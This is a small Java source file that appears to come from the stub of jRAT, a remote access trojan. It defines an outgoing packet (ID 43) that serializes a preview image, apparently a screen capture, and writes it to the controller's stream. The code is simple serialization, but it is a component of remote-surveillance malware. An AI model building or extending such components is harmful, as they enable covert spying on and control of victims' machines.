package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;
import io.jrat.common.utils.ImageUtils;
import java.awt.image.BufferedImage;
import java.io.DataOutputStream;

public class Packet43PreviewImage extends AbstractOutgoingPacket {

	private BufferedImage image;

	public Packet43PreviewImage(BufferedImage image) {
		this.image = image;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		byte[] buffer = ImageUtils.encode(image);
		
		dos.writeInt(buffer.length);
		dos.write(buffer);
	}

	@Override
	public short getPacketId() {
		return 43;
	}

}
